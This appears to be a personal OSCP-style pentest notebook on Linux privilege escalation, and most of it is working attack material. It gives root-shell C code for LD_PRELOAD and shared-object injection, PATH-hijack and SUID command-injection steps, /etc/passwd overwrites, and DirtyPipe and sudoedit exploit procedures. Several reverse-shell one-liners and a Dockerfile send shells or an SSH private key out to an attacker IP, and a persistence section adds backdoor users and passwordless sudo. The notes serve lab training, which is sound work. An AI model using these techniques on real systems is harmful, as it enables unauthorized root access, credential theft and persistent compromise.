# 03a. Linux Privilege Escalation
- [ ] Resources
- [Hacktricks Checklist](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)
- [GTFOBins](https://gtfobins.github.io/)
- [Compiled Kernel Exploits](https://github.com/lucyoa/kernel-exploits)
- [[Linux Privilege Escalation]]


### Get your droptools from:
- `/home/kali/Tools/ImmidiateTools/LinuxDropTools`

**Get Linux Smart Enum inc CVE check for kernel**
- https://github.com/diego-treitos/linux-smart-enumeration - This might need rebuilding from the main repo dir

```
wget http://192.168.45.202/lse_cve.sh
```

**Get linux Exploit suggester and run it**
- https://github.com/The-Z-Labs/linux-exploit-suggester

```
wget http://192.168.45.202/LinExpSugstr.sh
```

**Get linpeas**
```
wget http://192.168.45.202/linpeas.sh
```

**Get pspy64** (or 32)
```
wget http://192.168.45.202/pspy64
```

**Run lse_cve.sh** with a report
```
./lse_cve.sh | tee LSe_report.scrt
```

Read linpeas reports etc whilst pspy64 is running
```
timeout 5m ./pspy64 | tee pspy64_report.scrt
```


### User with valid credentials (sudo -l):
```
sudo -l
```
get version, below 1.28 can use `sudo -u#-1 /bin/bash`
```
sudo -V
```

#### with sudo -l if we see `LD_PRELOAD` env var, inject shell.so 

If we discover with `sudo -l` that the `env_keep+=LD_PRELOAD` is persisted we can create malicious `.so` to execute commands as a privleged user on a particular commnd. This is essentially the lever for "load this so file" before all others. [Read more](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)

Steps: - Assume we have sudo no pass on `/usr/bin/python3 /opt/event-viewer.py`

```
cd /tmp
vi shell.c
```

Example c code of `shell.c`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Run our vulnerable file.
```
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/python3 /opt/event-viewer.py
```




See whats connected

```
ss -nltp
```

Get user names which end in sh
```
cat /etc/passwd | grep sh$
```


### Check our groups ( eg are we in the `(disk)` group)
```
id
```

If so we can look in copys of the system and read root level data : `id_rsa` or `shadow` file

Check what drives there are :
```
df -h
```
then check them out , eg:

```
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
```

```
debugfs /dev/sda_X
```

Go into the drives and look at vital files: eg `shadow` and `passwd`

```
debugfs:  cat /etc/shadow
debugfs:  cat /etc/passwd
```

Then combine them with unshadow on your local machine
```
unshadow passwd.tmp shadow.tmp > toCrack.txt  
```

Then Crack with john
```
john --wordlist=/usr/share/wordlists/rockyou.txt toCrack.txt 
```

Once completed See the passwords 
```
john --show toCrack.txt                                            
root:explorer:0:0:root:/root:/bin/bash
dora:dor$ aemon:1000:1000::/home/dora:/bin/sh
```

**SUID Binaries**
```
find / -perm -u=s -type f 2>/dev/null
```
```
find / -perm -4000 2>/dev/null
```
```
/usr/sbin/getcap -r / 2>/dev/null
```
See what binaries you can run with `sudo`, head over to [GTFOBins](https://gtfobins.github.io/)

**Kernel Exploits:**
```
uname -a
```
- Good to know:
```
cat /etc/issue
```
```
cat /etc/*-release
```

- [ ] Check all Linpeas Kernel exploit suggestions - **Ignore the proababiities**
- [Compiled Kernel Exploits](https://github.com/lucyoa/kernel-exploits)


#### CVE-2021-3156 (Sudo Baron Samedit)
This version does all checks - https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py - used on Offsec Relia.

local copy at:
```
/home/kali/Tools/ImmidiateTools/LinuxDropTools/Sudo_edit_Baron_Samedit-CVE-2021-3156.py
``` 




**Writable /etc/passwd**

- [ ] see if you have write permission `passwd`
```
ls -la /etc/passwd
```

```
cp /etc/passwd passwd_back
```

Then This 1 liner
```
pw=$(openssl passwd monky123); echo "r00t:${pw}:0:0:root:/root:/bin/bash" >> /etc/passwd
```

su `r00t` with password `monkey123`



Longer way:
```
openssl passwd -1 -salt hacker hacker
```
and replace `root` password entry (or delete `x`
```
su root
```

Overrite passwd files useing tee from offsec `Megavolt`

```
(cat /etc/passwd && echo "toor:$(openssl passwd password):0:0:root:/root:/bin/bash") | sudo tee /var/log/httpd/../../../etc/passwd
<oot:/bin/bash") | sudo tee /var/log/httpd/../../../etc/passwd
```




- [ ] Checklist

- **Upgrade your shell** if it's not fully interactive
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

```
python -c 'import pty;pty.spawn("/bin/sh")'
```

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```
python3 -c 'import pty;pty.spawn("/bin/sh")'
```

- **Get system context** current user, hostname, groups

`whoami` `id` `hostname`

#### Check for SUID Binaries
```
find / -perm -u=s -type f 2>/dev/null
```

```
find / -perm -4000 2>/dev/null
```

- [ ] Look them up on GTFOBins - https://gtfobins.github.io/


Run suspicious `SUID` bins with using `ltrace` to trace the library calls. Like offsec `Escape`, OFfsec, `Workaholic`
```
ltrace /usr/bin/Suspicious_binary
```

Export the binaries to kali machien and inspect further 
```
strings Suspicious_binary
```

```
ghidra Suspicious_binary
```

```
gdb Suspicious_binary
```

Thsi tool might get you back to source code : https://pypi.org/project/retdec-python/


----


## ⚠️ Lateral Movement — Identify Webserver Account & Root (Linux)
### 1. Find common web entry-point files

- `find / -name "index.php" -o -name "index.html" -o -name "index.asp" -o -name ".htaccess" 2>/dev/null`
- `locate index.php 2>/dev/null`          # faster if updatedb has run

### 2. Find the server config file

#### Apache
- `find / -name "httpd.conf" -o -name "apache2.conf" 2>/dev/null`
- `cat /etc/apache2/apache2.conf 2>/dev/null`
- `cat /etc/httpd/conf/httpd.conf 2>/dev/null`
- `cat /etc/apache2/sites-enabled/*.conf 2>/dev/null`     # virtual hosts — check DocumentRoot here

#### Nginx
- `find / -name "nginx.conf" 2>/dev/null`
- `cat /etc/nginx/nginx.conf 2>/dev/null`
- `cat /etc/nginx/sites-enabled/* 2>/dev/null`            # virtual hosts

#### PHP-FPM (common on CTF boxes — runs as a separate user)
- `find / -name "www.conf" 2>/dev/null`
- `cat /etc/php*/fpm/pool.d/www.conf 2>/dev/null | grep -E "^user|^group"`

### 3. Identify the process and the account running it

- `ps aux | grep -E "apache|httpd|nginx|php-fpm"`         # shows the running user in column 1
- `ps aux | grep -E "apache2|httpd" | awk '{print $1}' | sort -u`    # extract just the usernames

#### Get more detail on the process owner
- `stat -c "%U %G" /proc/$(pgrep -x httpd | head -1)`    # owner of the process from /proc
- `ls -la /proc/$(pgrep apache2 | head -1)/exe`           # symlink to binary — confirms the process

#### Check which user the config declares
- `grep -E "^User|^Group" /etc/apache2/apache2.conf /etc/httpd/conf/httpd.conf 2>/dev/null`
- `grep -E "^user|^group" /etc/nginx/nginx.conf 2>/dev/null`

### 4. Check exploitable privileges or writable paths on the webroot

- `ls -la /var/www/html/`                                  # default Apache webroot
- `ls -la /usr/share/nginx/html/`                          # default Nginx webroot
- `find /var/www -writable -type f 2>/dev/null`            # writable files — can you drop a shell?
- `find /var/www -writable -type d 2>/dev/null`            # writable directories

#### Check if the webserver user has a shell or useful sudo rights
- `grep -E "www-data|apache|nginx|http" /etc/passwd`       # does it have a login shell?
- `sudo -l -U www-data 2>/dev/null`                        # what can it sudo? (needs sufficient privs to query)
- `cat /etc/sudoers 2>/dev/null | grep -E "www-data|apache|nginx"`

---







- **Check for users && writable /etc/passwd**
```
ls -la /etc/passwd` `cat /etc/passwd
```
- **Check environment**
```
echo $PATH
```

```
(env || set) 2>/dev/null
```

```
cat ~/.bashrc
```

```
cat .bash_history
```

- **Check processes** any elevated/other user
```
ps aux
```

```
ps -ef
```

```
watch -n 1 "ps -aux | grep pass"
```


- **Check cronjobs**
```
ls -lah /etc/cron*
```
```
cat /etc/crontab
```
```
cat /var/log/syslog | grep cron
```
```
cat /var/log/cron.log
```
```
grep "CRON" /var/log/syslog
```
```
ls -la /etc/cron.d
```

```
cat /etc/cron.d/*
```

```
ls -la /etc/cron.hourly
```
- **Check your writable/usable files & file permissions**
```
find / -writable -type d 2>/dev/null
```
```
find / -perm -u=s -type f 2>/dev/null
```
```
ls -la
```
- **Check networking & services running on localhost. Compare the services on the outside to those on the inside** 
```
netstat -ano
```
Also:

`ip a`    `ss -anp`


- **Then check which ports are allowed out externally. Whats the delta?**

```
netsh firewall show state
```

- **Check installed programs**

```
dpkg -l
```

- [ ] `/var/`, 
- [ ] `/opt/`, 
- [ ] `/usr/local/src` and `/usr/src/` are good directories to dig through as well



# Quick cred search in a focused location
```
grep -rHns -iE "password|passwd|pwd|secret|root|cred" --include="*.php" --include="*.py" --color=always 2>/dev/null
```

**All files**
```
grep -rHns -iE "password|passwd|pwd|secret|root|cred" --color=always  2> /dev/null
```


### Quick Cred search

```
grep -rHns -iE "password|passwd|pwd|secret|root|cred" --color=always /var | grep -iEv "cache|lib|log|backups"  2> /dev/null
```


Look though emails ( you never know!) 

```
cat /var/mail/*
```
If you get shell look though
```
cat /var/spool/mail/*
```



### ⚠️ Look for archives and compressed files

```
find /path/to/search -type f \( \
  -iname "*.zip" -o -iname "*.rar" -o -iname "*.7z" -o -iname "*.tar.gz" -o \
  -iname "*.tgz" -o -iname "*.tar.bz2" -o -iname "*.tbz2" -o \
  -iname "*.tar.xz" -o -iname "*.txz" -o -iname "*.gz" \) -print
```

#### Mega conf search 
```
find / -type f \( -name "*.script" -o -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.xml" -o -name "*.json" -o -name "*.yaml" -o -name "*.yml" -o -name "*.env" -o -name "*.properties" -o -name "*.java" -o -name "*.htaccess" -o -name "*.nginxconf" -o -name "*.toml" -o -name "*.cnf" -o -name "*.mycnf" -o -name "*.ora" -o -name "*.db" -o -name "*.sql" -o -name "*.webconfig" -o -name "php*.ini" -o -name "*.sh" -o -name "*.bat" -o -name "*.cmd" -o -name "*.ps1" -o -name "*.rb" -o -name "*.py" -o -name "Dockerfile" -o -name "*.vmx" -o -name "Vagrantfile" -o -name "*.pcf" -o -name "*.ovpn" -o -name "*.gitconfig" -o -name "*.hgignore" -o -name "*.plist" -o -name "*.reg" \) -exec grep -HnE "(username|user|userid|login|passw|password|passwd|pass|api[_-]?key|access[_-]?token)[:=]\s*[\"']?\w+[\"']?" {} + > Conf-Report.txt
```

**Alt maybe ...**

```
find / -path /proc -prune -o -path /sys -prune -o -path /dev -prune -o -path /run -prune -o -path /tmp -prune -o -type f \( -iname "*.conf" -o -iname "*.config" -o -iname "*.ini" -o -iname "*.xml" -o -iname "*.json" -o -iname "*.yaml" -o -iname "*.yml" -o -iname "*.env" -o -iname "*.properties" -o -iname "*.java" -o -iname ".htaccess" -o -iname "*.nginxconf" -o -iname "*.toml" -o -iname "*.cnf" -o -iname "*.mycnf" -o -iname "*.ora" -o -iname "*.db" -o -iname "*.sql" -o -iname "*.webconfig" -o -iname "php*.ini" -o -iname "*.php" -o -iname "*.phtml" -o -iname "*.inc" -o -iname "*.sh" -o -iname "*.bat" -o -iname "*.cmd" -o -iname "*.ps1" -o -iname "*.rb" -o -iname "*.py" -o -iname "Dockerfile" -o -iname "*.vmx" -o -iname "Vagrantfile" -o -iname "*.pcf" -o -iname "*.ovpn" -o -iname "*.gitconfig" -o -iname "*.hgignore" -o -iname "*.plist" -o -iname "*.reg" \) -print0 | xargs -0 grep -IHnE "(username|user|userid|login|passw|password|passwd|pass|api[_-]?key|access[_-]?token)[:=][[:space:]]*[\"']?[[:alnum:]_@./-]{1,}[\"']?" > Conf-Report.txt 2>/dev/null
```

Catch SQL style passwords

```
find / -type f \( -name "*.script" -o -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.xml" -o -name "*.json" -o -name "*.yaml" -o -name "*.yml" -o -name "*.env" -o -name "*.properties" -o -name "*.java" -o -name "*.htaccess" -o -name "*.nginxconf" -o -name "*.toml" -o -name "*.cnf" -o -name "*.mycnf" -o -name "*.ora" -o -name "*.db" -o -name "*.sql" -o -name "*.webconfig" -o -name "php*.ini" -o -name "*.sh" -o -name "*.bat" -o -name "*.cmd" -o -name "*.ps1" -o -name "*.rb" -o -name "*.py" -o -name "Dockerfile" -o -name "*.vmx" -o -name "Vagrantfile" -o -name "*.pcf" -o -name "*.ovpn" -o -name "*.gitconfig" -o -name "*.hgignore" -o -name "*.plist" -o -name "*.reg" \) -exec grep -HinE --text "(?i)(user|login|pass|key|token).*" {} + > Conf-Report.txt 2>/dev/null
```

**Reverse Shell 1-Liner** - Jeff Price method from [Pentest Monkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.202 4444 >/tmp/f
```

...or Busybox if it is on the box

```
busybox nc 192.168.45.202 4444 -e sh
```


## 🧩 Cron Privilege Escalation Discovery Checklist

- [ ] 🧭 1. Check if cron is running
```bash
ps aux | grep cron
```
- If it's not running, move on.
- If it's running, game on.

- [ ] list all thje cron files 

```
ls -la /etc/cron.d/
```

- [ ] have a look at all the cron files of 
```
cat /etc/cron.d/*
```
- Check for scripts run as `root`
- Check for scripts in **writable** paths (`/tmp`, `/var/www`, etc.)

Look at the cron sys logs
```
grep -i CRON /var/log/syslog
```


- [ ] 📂 3. Explore timed directories
```bash
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/
ls -la /etc/cron.weekly/
```
- Check for **writable files**
- Check if any run your **user-controlled files**

- [ ] 🔎 4. Check user-specific cron jobs
```bash
ls -la /var/spool/cron/crontabs/
cat /var/spool/cron/crontabs/*
```
- Look for jobs owned by `root`
- Look for **absolute paths to scripts**

- [ ] 👤 5. Check current user’s cron
```bash
crontab -l
```
- Even if empty, check anyway
- Then check `crontab -e` if allowed

- [ ] 📂 2. Look in all system-wide cron files ()
```bash
cat /etc/crontab
```


- [ ] 🔥 6. Scan for world-writable or user-writable scripts
```bash
find / -type f -name "*.sh" -writable 2>/dev/null
find / -type f -perm -o=w 2>/dev/null
```
- Match these against the scripts seen in cron jobs

- [ ] 🕵️‍♂️ 7. Use `pspy` to watch real-time cron activity
- Upload and run:
```
wget -O pspy64 http://192.168.45.202/pspy64
```

```bash
./pspy64
```
- Watch for `/bin/bash /path/to/script` executed as UID=0
- Look for **repeat patterns** every minute, 5 mins, etc.

- [ ] 🧠 8. If writable script is run by root → escalate
```bash
echo 'bash -i >& /dev/tcp/YOURIP/YOURPORT 0>&1' >> vulnerable_script.sh
```

#### Lots of Linux Privesc Techniques here beyond GTFO bins
- https://morgan-bin-bash.gitbook.io/linux-privilege-escalation

And here
- https://x7331.gitbook.io/boxes/tl-dr/infra/os/linux/privilege-escalation

Really useful sire for overall Linux and more 
- https://tex2e.github.io/reverse-shell-generator/index.html

Linux wildcard wild card tricks here - https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#wildcards-spare-tricks

#### Linux Privesc -  Reference Kernel exploits via my local machine and then comapre 
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '

#### Linux Privesc -  Check exploit suggestor
https://github.com/The-Z-Labs/linux-exploit-suggester

```
sudo -V                                                # Linux Privesc -  check for vuln versions of Sudo
sudo -s                                                # Linux Privesc -  change to sudo but -s keeps the shell as it is 
```

##### SUID being called without explicit path definition

If we find a `SUID` file being called like `/usr/bin/status` (or `ps` like in `NullByte`) without the explicit full path to the binary it uses such as `service` **and** we see that the path var could be edited to search in the `/tmp` **first** we can place a malicious file in `/tmp` so that when we call the `SUID` file , it calls our malicious file first , launching a shell !!! (Offsec sunset-midnight)

1. Go to /`tmp`
```
cd /tmp
```
2. make a new file for `service`
```
echo "/bin/sh" > service
```
3. Make executable
```
chmod +x service
```

4. update the `PATH` var
```
export PATH=/tmp:$PATH
```

5. Run the `SUID` bin as you would and lauch the shell
```
/usr/bin/status
```

Also see the notes for OSPG `NullByte` 
eg:

```
ramses@NullByte:/var/www/backup$ echo /bin/sh > ps
ramses@NullByte:/var/www/backup$ chmod 777 ps
ramses@NullByte:/var/www/backup$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:/var/www/backup$ export PATH=.:$PATH
ramses@NullByte:/var/www/backup$ ./procwatch 
# 
```


##### SUID - Shared object Injection

If a SUID binary calls `.so` files ( dlls in linux world) and we can replace or inject them, we could launch a shell.

1. find SUIDs
```
find / -type f -perm -u=s 2>/dev/null
```
2. Check file type 
```
file /binary/path/of/some-SUID-file
```
3. Check the ownership
```
ls -la /binary/path/of/some-SUID-file
```

4. run the Binary with `strace` , filtering for open or access system calls to load files, including libraries. If the trace shows that the binary attempts to load a `.so` file but fails due to its absence, this is a strong indication positive vector.

```
strace /binary/path/of/some-SUID-file 2>&1 | grep -iE "open|access|no such file"
```

we might see a message like this :
```bash
...
openat(AT_FDCWD, "/place/the/shared/object/lives.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
```

5. Check if the bianry is doing dynamic opening of shared objects calling things like `dloopen`

```
strings backup-sync | grep dlopen   
```

and/or

```
ltrace ./some-SUID-file | grep dlopen
```

6. Create a custom `.so` file named as ther missing/broken `.so` file eg: `lives.so`

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```

(Declare a private function called `inject`, and make it run automatically as soon as this `.so` is loaded.) `-p` == preserve ... root


7. compile the binary  with `-fPIC` ( format `Position Indpendent Code`) so its less constrained
```
gcc -shared -o /place/the/shared/object/lives.so -fPIC ./lives.c
```

**Note:** You can compile on different Linux containers if you get compilation errors ( OSPG Cobweb) BUT THIS IS INSECURE FORM PRODUCTION/PROFESSIONAL SYSTEMS `--nogpgcheck` becasue we are not checking for signatures. BE CAREFUL 

```
docker run --rm -v "$PWD":/src -w /src LINUXVERSION bash -lc \
"dnf -y --setopt=install_weak_deps=False --nogpgcheck install gcc glibc-devel && gcc -O2 -o rootshell_el8 rootshell.c"
```
```
docker run --rm -v "$PWD":/src -w /src almalinux:8.4 bash -lc \
"dnf -y --setopt=install_weak_deps=False --nogpgcheck install gcc glibc-devel && gcc -O2 -o rootshell_el8 rootshell.c"
```



8. create the file path exactly as it is missing from the `strace` binary 
```
mkdir /place/the/shared/object/
cp lives.so /place/the/shared/object/
```

9. execute the binary agains and in this case you should get a root shell becasue `/place/the/shared/object/lives.so` will now be executed
```
/binary/path/of/some-SUID-file
```

##### run a SUID binary with gdb to inspect further

Example from (Offsec ProStore)

Quiete (`-q`) look at the binary run:
```
gdb -q /usr/local/bin/log_reader                            # The Target Binary
```

See if it will list the source code file executed

```
(gdb) list
1       /tmp/log_reader.c: No such file or directory.       # A temp file whic his run .. So where is it normally
(gdb) exit
```

Try and find that file
```
find / -name "log_reader.c" 2>/dev/null                     # Look for it in the System
```

### SUID Binary with Command Injection (eg; cat + filename)

**Pattern:**  
A SUID root binary takes a filename, then builds and executes a shell command like:

```c
void readFile(char *filename) {
    setuid(0);
    setgid(0);

    printf("Reading: %s\n", filename);

    char command[200] = "/usr/bin/cat ";
    char output[10000];
    FILE *result;

    strcat(command, filename);          // ⚠ user-controlled
    result = popen(command, "r");       // executes via /bin/sh -c
    ...
}
```
Because filename is concatenated directly into command and passed to popen(), anything after the filename is executed as root by the shell.



#### cat file.txt permits command appending ( Offsec PwnLab)

If we sense a `suid` is running something like `cat file.txt` we could create a new `cat` in out local dir or `/tmp` like :

```
cd /tmp
```

```
echo /bin/bash > cat
```
Change the perms
```
chmod 777 cat
```

set the `PATH` env var to the dir where the new `cat` is kept: eg

```
export PATH=/tmp:$PATH
```

Then run the suid again to get lateral movment as the user who the file runs as 

```
./msgmike
```

Another binary `./msgroot` has `SUID` and runs unsanitised user supplied data like 
```
sh -c /bin/echo <USER_DATA>
```
then we could run the binariary with a persisted bash session 

```
./msgmike & /bin/bash -p
```

---


### SUID taking untrusted input with a weak PATH ( tom + whoami)

Lets say we have a dodgy `SUID` binary which checks if the user is `tom` by running `whoami` and comparing the output. If the user is `tom`, it grants access and gives a root shell.

For example `cat rootshell.c`:

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main() {

    printf("checking if you are tom...\n");
    FILE* f = popen("whoami", "r");

    char user[80];
    fgets(user, 80, f);

    printf("you are: %s\n", user);
    //printf("your euid is: %i\n", geteuid());

    if (strncmp(user, "tom", 3) == 0) {
        printf("access granted.\n");
        setuid(geteuid());
        execlp("sh", "sh", (char *) 0);
    }
}
```

If

If we find a `SUID` binary which expects something like `whoami` to tell it who we are (and makes an access decision based on that), and it resolves `whoami` via `PATH` (i.e., doesn’t use a full path), and we can control the `PATH` environment variable, we could swap this out for our malicious one.
1. `cd /tmp`
2. `echo "printf "tom"" > whoami`    - We spoof the identity 
3. `chmod 777 whoami`
4. `export PATH=/tmp:$PATH`
5. run the dodgy `./rootshell` `SUID`  and get the root shell



### Exploit example: turn /bin/bash into a SUID-root shell

Create a harmless log file:
```
echo "test" > 1.log
```
Use the SUID binary (e.g. `log_reader`) to run a root command via command injection:

```
/usr/local/bin/log_reader "1.log && chmod u+s /bin/bash"
```

Internally this becomes:
```
cat 1.log && chmod u+s /bin/bash
```
Both commands run as root.

From your normal user shell, spawn a root shell:

```
/bin/bash -p
```
`-p` tells bash to keep the effective UID (root) instead of dropping privileges.

In the file we may see that when can append termianl commands for example `;chmod u+s /bin/bash"` or `&& chmod u+s /bin/bash"`






##### Linux Kernel Exploits - CVE-2022-0847 DirtyPipe

"DirtyPipe_exp_CVE-2022-0847" ( copy of the binary of https://github.com/Al1ex/CVE-2022-0847 [CVE-2022-0847] DirtyPipe ) 

```
wget http://192.168.45.202/DirtyPipe_exp_CVE-2022-0847

```

1. make a backup of `/etc/passwd`                   
```
cp /etc/passwd /tmp/passwd.bak                             
```

2. Run the exploit binary adding ootz             
```
./DirtyPipe_exp_CVE-2022-0847 /etc/passwd 1 ootz:          
```

3. switch to the new root user                    
```
su rootz                                                   
```

4. double check you id level and read the shadow  
```
id                                                         
```

-----

#### CVE-2023-22809 - Sudoedit Privesc

Privesc of Sudo version 
[Wlakthrough](https://www.youtube.com/watch?v=59-7Msc3lzg)
Sudo Version 1.8.0 - 1.9.12pl
[Lab](https://app.cyberranges.com/scenario/63cffab903272a001d9efd8fv)

The user needs `sudoedit` permission via `sudo -l` on an arbitry file 

if the user has `sudo sudoedit /etc/something` and the version is in in range , we can 
define and env var for the user to specify the editor ( eg, vi, VIm , nano) **AND append a file we want to maliciously** edit such as `/etc/passwd`  to make out user at root level `john:0:0/bin:`

```
export EDITOR="vim -- /etc/passwd"
```

( its the `--`) whci hmakes this possible as it is handled like a file name.

Now if we run:
```
sudo sudoedit /etc/something
```

We will be presented with a vim terminal to edit the `/etc/passwd` file 

---


## Tar Wildcard injection - PE 

From [Here](https://x7331.gitbook.io/boxes/tl-dr/infra/os/linux/privilege-escalation/wildcard-injection) (OSPG: Cockpit, Charlie )

We find a cron job running a backup on tar (or you have SUDO) and has a wildacrd for the file names. We can name files as Tar commands and get tar to run commands as sudo

```
cd /opt/admin
```

Create the reverse shell script
```
echo "mkfifo /tmp/bhksuw; nc 192.168.45.202 4444 0</tmp/bhksuw | /bin/bash >/tmp/bhksuw 2>&1; rm /tmp/bhksuw" > shell.sh
```

Adding execute permissions to the script
```
chmod +x shell.sh
```
Create a checkpoint the executes the script
```
touch -- "--checkpoint-action=exec=sh shell.sh"
```
Create the checkpoint trigger ( `1` means after every turn )
```
touch -- "--checkpoint=1"
```

Wait for `tar` cron job or if sudo permitted run `tar`

---

#### Overwrite /etc/passwd to add new r00t user (ospg Injecto)
1. Create a new password for a user `r00t`
```
pw=$(openssl passwd monkey123); echo "r00t:${pw}:0:0:root:/root:/bin/bash"
```
Output like: `r00t:4mzXKZPkoegG2:0:0:root:/root:/bin/bash`
2. The output of that command in a file like : `/dev/shm/tmp.file` or append it to a coopy of the file 
3. Then overwite the `/etc/passwd` file calling locally
```
curl file:///dev/shm/tmp.file -o /etc/passwd
```
Alt: 
```
curl http://192.168.10.10/tmp.file -o /etc/passwd
```


## SUDO on docker to build and see images Dockerfile 

If we see something like these in `SUDO -l`
```
/usr/bin/docker images
/usr/bin/docker build *
```
We could build a nasty image to get back a the root ssh key 
```
FROM alpine

COPY id_rsa.bak /var/tmp/id_rsa
RUN nc -w 3 192.168.45.157 9001 < /var/tmp/id_rsa
```

The above `Dockerfile` build a new image based off of the alpine image. When we build the new image, the `id_rsa.bak` file will be copied into it and then the contents will be piped out to a listener waiting on our kali machine.

```
nc -nlvp 9001
```

```
sudo docker build -f /opt/Dockerfile /opt/
```

---


### Privilege Escalation via Writable Systemd Service File

If we discover a service is writeable such as the following 
- `cat /etc/systemd/system/spiderbackup.service`
```
[Unit]
Description=Spider Society Backup Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/spiderbackup.sh
User=root
Group=root

[Install]
WantedBy=multi-user.target                          
```

We can compltely overwite this service file to the absolute basic of: 
```
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.202/4444 0>&1'
```

We then need to tell systemd to re-read all service files from disk.
```
sudo systemctl daemon-reload
```

then we stop and restart the service
```
sudo /bin/systemctl restart spiderbackup.service
```

IF we cant ru nthe restart command we could aslo consider 
- **pspy** — watch for the service being triggered automatically by root
- **Writable script** — if `ExecStart` calls a script you can write to, inject payload there and wait
- **Writable binary in PATH** — same idea, anything root executes automatically
- **Kill PID** — won't help, you can't force a daemon-reload
- **Reboot** — last resort, rarely viable in exam

---


# Persistance

## Changing/adding passwords

- Create a new user `clive` (home + bash) and give a simple password:
```
sudo useradd -m -s /bin/bash clive && echo 'clive:Tuesday@2' | sudo chpasswd
```

- Alt: Create user with a hashed password:
```
sudo useradd -m -s /bin/bash -p "$(openssl passwd -6 'Tuesday@2')" clive
```

- Update the root users password
```
echo 'root:Tuesday@2' | sudo chpasswd
```

- Alt: Change root password with a SHA-512 hash:
```
sudo usermod -p "$(openssl passwd -6 'Tuesday@2')" root
```



#### Give your user full sudo and root
```
echo 'USERNAME ALL=(ALL:ALL) ALL' > /etc/sudoers.d/USERNAME && chmod 440 /etc/sudoers.d/USERNAME
```

##### passwordless full sudo (`be careful with this`):
```
echo 'USERNAME ALL=(ALL:ALL) NOPASSWD:ALL' > /etc/sudoers.d/USERNAME && chmod 440 /etc/sudoers.d/USERNAME
```

----
#### Screen 4.5.0 Privesc
- Current best version: https://github.com/YasserREED/screen-v4.5.0-priv-escalate/tree/main as alternative from https://www.exploit-db.com/exploits/41154


---

```
ls -la                                                 # Linux Privesc -  HAve a look ain the home dir 
ls -la /usr/local/                                     # Linux Privesc -  Things in the /usr/local are normally placed explicitly by the admin so could be interesting and non standard. The package manager would not have put it there.
echo $PATH
(env || set) 2>/dev/null                               # Linux Privesc -   Whats in the env

ip -a                                                  # Linux Privesc -  eth0 see if funny NAT stuff going on 
sudo -l                                                # Linux Privesc -  This will list all the commands the user can run as root. May require user Auth
ps -ef --forest  
ps axjf  
ss -lntp                                               # Linux Privesc -  see if anything is listening 

cat /etc/os-release 2>/dev/null

find / -type f -perm -4000 -ls 2>/dev/null             # Linux Privesc -  find SUIDs
Linpeas - the phrase "Unknown SUID binary!"            # Linux Privesc -  find Unknown SUIDs
find / -type d -writable -exec echo {} \; 2>/dev/null  # Linux Privesc -  find places where I can write to files
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; 2>/dev/null  
find / -type d -perm -u=w -print 2>/dev/null           # Linux Privesc -  find places where "others" o can write to files
find / -type d -perm -g=w -print 2>/dev/null           # Linux Privesc -  find places where groups can write to files



systemctl list-units --type=service                    # Linux Privesc -  will all the services which are running
find /etc/ -name *.service`                            # Linux Privesc -  will also list the services

lsb_release -a                                         # Linux Privesc -  get the linux Kernel version running 

# We can then cat the service files to see how `systemd` starts it - # Linux Privesc -
cat /etc/systemd/system/SOME-SERVICE.service           # Linux Privesc -

cat /usr/local/etc/doas.conf                           # Linux Privesc -    Doas is an alt to sudo from bsd and the cnf file might list provledged commands which can be run
find /intreting/directory/ -writable                   # Linux Privesc -                               
grep -R system .                                       # Linux Privesc -
grep -R popen .                                        # Linux Privesc -
                                                       # Linux Privesc -  Look at the web server maybe in `/opt` or `/var/www`
cat /etc/cron.d/*                                      # Linux Privesc -  - Look at all the cron jobs

```



##### LinPeas
- `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee >(ansi2html > LinPeasReport.html)`
- `wget -qO- https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
